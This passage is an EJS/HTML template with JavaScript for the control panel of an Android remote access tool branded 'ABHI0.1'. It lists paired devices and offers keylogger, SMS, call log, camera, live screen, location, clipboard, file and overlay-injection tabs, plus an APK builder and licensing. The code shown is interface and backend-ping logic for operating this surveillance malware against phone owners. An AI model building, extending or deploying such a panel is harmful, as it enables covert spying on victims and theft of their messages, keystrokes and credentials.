            <span class="material-symbols-outlined">contacts</span><span>Contacts</span>
        </div>
        <div class="nav-item" data-tab="sms">
            <span class="material-symbols-outlined">sms</span><span>SMS</span>
        </div>
        <div class="nav-item" data-tab="calls">
            <span class="material-symbols-outlined">call</span><span>Call Log</span>
        </div>
        <div class="nav-item" data-tab="notifications">
            <span class="material-symbols-outlined">notifications</span><span>Notifications</span>
        </div>
        <div class="nav-item" data-tab="camera">
            <span class="material-symbols-outlined">photo_camera</span><span>Camera</span>
        </div>

        <div class="nav-section">Apps &amp; Data</div>
        <div class="nav-item" data-tab="apps">
            <span class="material-symbols-outlined">apps</span><span>Apps</span>
        </div>
        <div class="nav-item" data-tab="scanner">
            <span class="material-symbols-outlined">qr_code_2</span><span>Scanner</span>
        </div>
        <div class="nav-item" data-tab="files">
            <span class="material-symbols-outlined">folder_open</span><span>Files</span>
        </div>
        <div class="nav-item" data-tab="keylog">
            <span class="material-symbols-outlined">keyboard</span><span>Keylogger</span>
        </div>

        <div class="nav-section">Device</div>
        <div class="nav-item" data-tab="permissions">
            <span class="material-symbols-outlined">security</span><span>Permissions</span>
        </div>
        <div class="nav-item" data-tab="location">
            <span class="material-symbols-outlined">location_on</span><span>Location</span>
        </div>
        <div class="nav-item" data-tab="lock">
            <span class="material-symbols-outlined">lock</span><span>Lock</span>
        </div>
        <div class="nav-item" data-tab="inputviz">
            <span class="material-symbols-outlined">visibility</span><span>Input Visualization</span>
        </div>
        <div class="nav-item" data-tab="options">
            <span class="material-symbols-outlined">tune</span><span>Options</span>
        </div>

        <div class="nav-section">Injection</div>
        <div class="nav-item" data-tab="inject">
            <span class="material-symbols-outlined">layers</span><span>Injection (ject)</span>
        </div>
        <div class="nav-item" data-tab="injector">
            <span class="material-symbols-outlined">web</span><span>Overlay</span>
        </div>

        <div class="nav-section">Network</div>
        <div class="nav-item" data-tab="browser">
            <span class="material-symbols-outlined">open_in_browser</span><span>Browser (brows)</span>
        </div>
        <div class="nav-item" data-tab="proxy">
            <span class="material-symbols-outlined">vpn_key</span><span>Proxy</span>
        </div>
        <div class="nav-item" data-tab="redirect">
            <span class="material-symbols-outlined">swap_horiz</span><span>Redirect</span>
        </div>

        <div class="nav-section">System</div>
        <div class="nav-item" data-tab="broadcast">
            <span class="material-symbols-outlined">campaign</span><span>Broadcast (bc)</span>
        </div>
        <div class="nav-item" data-tab="search">
            <span class="material-symbols-outlined">search</span><span>Media Search (srh)</span>
        </div>
        <div class="nav-item" data-tab="clipboard">
            <span class="material-symbols-outlined">content_paste</span><span>Clipboard (clip)</span>
        </div>
        <div class="nav-item" data-tab="services">
            <span class="material-symbols-outlined">dns</span><span>Services</span>
        </div>
        <div class="nav-item" data-tab="settings">
            <span class="material-symbols-outlined">settings</span><span>Settings</span>
        </div>
        <% if (typeof currentUser !== 'undefined' && currentUser) { %>
        <div class="nav-item" onclick="window.location.href='/apk-builder'">
            <span class="material-symbols-outlined">android</span><span>APK Builder</span>
        </div>
        <% } %>
        <% if (typeof isSuperAdmin !== 'undefined' && isSuperAdmin && typeof adminSecretOk !== 'undefined' && adminSecretOk) { %>
        <div class="nav-item" onclick="window.location.href='/admin'">
            <span class="material-symbols-outlined">admin_panel_settings</span><span>Admin Panel</span>
        </div>
        <% } %>

        <div class="sidebar-footer">ABHI0.1 · APK v<%= os_version || '—' %></div>
    </div>

    <!-- Main -->
    <div class="main">
        <!-- Topbar -->
        <div class="topbar">
            <button class="topbar-menu btn" id="menuBtn" onclick="toggleSidebar()">
                <span class="material-symbols-outlined" style="font-size:20px">menu</span>
            </button>
            <div class="topbar-brand">ABHI0.1</div>
            <div class="topbar-title" id="topbarTitle">Dashboard</div>
            <div class="topbar-badge" title="Signed-in account">
                <span class="material-symbols-outlined" style="font-size:16px">account_circle</span>
                <span id="topbarUser"><%= (typeof currentUser !== 'undefined' && currentUser) ? currentUser.username : 'guest' %></span>
                <span id="topbarRole" style="opacity:.8"><%= (typeof isSuperAdmin !== 'undefined' && isSuperAdmin) ? 'SUPER ADMIN' : ((typeof license !== 'undefined' && license && license.active) ? ('License: ' + license.daysLeft + 'd') : 'License inactive') %></span>
                <a href="/logout" style="color:inherit;text-decoration:none;font-weight:700;margin-left:6px">Logout</a>
            </div>
            <div class="topbar-badge">
                <div class="topbar-dot" id="topbarDot"></div>
                <span id="topbarConnLabel">Checking...</span>
                <span class="topbar-sel" id="topbarDeviceName" title="Selected device">All devices</span>
            </div>
            <button class="btn btn-outline btn-sm" onclick="openUrlModal()" title="Set server URL">
                <span class="material-symbols-outlined">link</span>
            </button>
        </div>

        <!-- Content -->
        <div class="content" id="mainContent">

<!-- ========== HOME ========== -->
<div id="home" class="tab-view active">
    <div class="page-head">
        <div class="page-head-main">
            <div class="page-kicker">ABHI0.1 &middot; Control Panel</div>
            <h2 class="page-h">Dashboard</h2>
            <div class="page-sub">Device, server aur tunnel &mdash; sab ek screen pe.</div>
        </div>
        <div class="panel-actions">
            <button class="btn btn-ghost btn-sm" onclick="selectDevice('all')">
                <span class="material-symbols-outlined">select_all</span> All
            </button>
            <button class="btn btn-ghost btn-sm" onclick="loadDevices()">
                <span class="material-symbols-outlined">refresh</span> Refresh
            </button>
        </div>
    </div>

    <div class="stat-row">
        <div class="stat-tile">
            <span class="stat-k">Online</span>
            <b class="stat-v" id="ngOnline">0</b>
            <span class="stat-s">devices live right now</span>
        </div>
        <div class="stat-tile">
            <span class="stat-k">Paired</span>
            <b class="stat-v" id="ngTotal">0</b>
            <span class="stat-s">total devices on panel</span>
        </div>
        <div class="stat-tile">
            <span class="stat-k">Server</span>
            <b class="stat-v" id="ngServer">&mdash;</b>
            <span class="stat-s" id="ngServerS">backend :22222</span>
        </div>
        <div class="stat-tile stat-url" onclick="ngCopyUrl()" title="Click to copy this address">
            <span class="stat-k">Address</span>
            <b class="stat-v stat-url-v" id="ngUrl">&mdash;</b>
            <span class="stat-s" id="ngUrlS">tap to copy</span>
        </div>
    </div>

    <div class="quick-row">
        <button class="qtile" onclick="ngGo('hbcn')"><span class="material-symbols-outlined">cast</span>Live Screen</button>
        <button class="qtile" onclick="ngGo('keylog')"><span class="material-symbols-outlined">keyboard</span>Keylogger</button>
        <button class="qtile" onclick="ngGo('location')"><span class="material-symbols-outlined">location_on</span>Location</button>
        <button class="qtile" onclick="ngGo('files')"><span class="material-symbols-outlined">folder_open</span>Files</button>
        <button class="qtile" onclick="ngGo('sms')"><span class="material-symbols-outlined">sms</span>SMS</button>
        <button class="qtile" onclick="window.location.href='/apk-builder'"><span class="material-symbols-outlined">android</span>APK Builder</button>
    </div>

    <div class="panel-hdr">
        <h2>Online Devices</h2>
    </div>
    <div id="devicesList" class="devices-list">
        <div class="device-empty">
            <span class="material-symbols-outlined">phone_android</span>
            Connecting to backend...
        </div>
    </div>
</div>

<script>
/* Dashboard header widgets: live counts, server state, copyable address. */
(function () {
    function setText(id, value) {
        var el = document.getElementById(id);
        if (el && el.textContent !== value) el.textContent = value;
    }
    function tick() {
        var cards = document.querySelectorAll('#devicesList .device-card');
        var on = 0;
        for (var i = 0; i < cards.length; i++) {
            var dot = cards[i].querySelector('.device-card-dot');
            if (dot && dot.classList.contains('online')) on++;
        }
        setText('ngOnline', String(on));
        setText('ngTotal', String(cards.length));
    }
    var ngPublic = location.origin;
    function probe() {
        var t0 = (performance && performance.now) ? performance.now() : Date.now();
        fetch('/api/ping', { cache: 'no-store' }).then(function (res) {
            var ms = Math.round(((performance && performance.now) ? performance.now() : Date.now()) - t0);
            if (res.ok) {
                setText('ngServer', 'ONLINE');
                setText('ngServerS', 'backend :22222 \u00b7 ' + ms + 'ms');
            } else {
                setText('ngServer', 'DOWN');
                setText('ngServerS', 'backend :22222 \u00b7 no reply');
            }
        }).catch(function () {
            setText('ngServer', 'DOWN');
            setText('ngServerS', 'backend :22222 \u00b7 unreachable');
        });
        fetch('/api/config', { credentials: 'same-origin' }).then(function (res) {
            if (!res.ok) return res;
            return res.json().then(function (j) {
                var pub = (j && j.connection && j.connection.public_url) || (j && j.server && j.server.publicUrl) || '';
                if (pub) {
                    ngPublic = pub;
                    setText('ngUrl', pub.replace(/^https?:\/\//, ''));
                }
            });
        }).catch(function () {});
    }
    window.ngGo = function (tab) {
        var el = document.querySelector('.nav-item[data-tab="' + tab + '"]');
        if (el) el.click();
    };
    window.ngCopyUrl = function () {
        var value = ngPublic;
        var note = document.getElementById('ngUrlS');
        function done() { if (note) { note.textContent = 'copied — paste it anywhere'; setTimeout(function () { note.textContent = 'tap to copy'; }, 2200); } }
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(value).then(done, function () { legacy(); });
        } else { legacy(); }
        function legacy() {
            var ta = document.createElement('textarea');
            ta.value = value; ta.setAttribute('readonly', '');
            ta.style.position = 'fixed'; ta.style.opacity = '0';
            document.body.appendChild(ta); ta.select();
            try { document.execCommand('copy'); } catch (e) {}
            document.body.removeChild(ta);
            done();
        }
    };
    setInterval(tick, 2000);
    setInterval(probe, 10000);
    document.addEventListener('DOMContentLoaded', function () { tick(); probe(); });
    setTimeout(function () { tick(); probe(); }, 400);
})();
</script>

<!-- ========== HBNC LIVE SCREEN ========== -->
<div id="hbcn" class="tab-view">
